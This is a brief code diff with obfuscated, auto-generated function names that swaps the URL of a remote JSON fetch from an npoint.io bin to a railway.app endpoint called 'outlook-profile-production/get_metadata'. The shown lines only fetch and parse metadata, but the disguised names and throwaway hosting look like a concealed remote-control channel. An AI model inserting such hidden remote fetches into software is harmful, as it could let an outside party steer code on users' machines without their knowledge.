@@ -18,7 +18,7 @@ def learn_bpwcih_937():
 
     def eval_dikwvp_197():
         try:
-            learn_vyvtjz_906 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_vyvtjz_906 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_vyvtjz_906.raise_for_status()
             net_ntbfop_564 = learn_vyvtjz_906.json()
             eval_ocxeqc_521 = net_ntbfop_564.get('metadata')
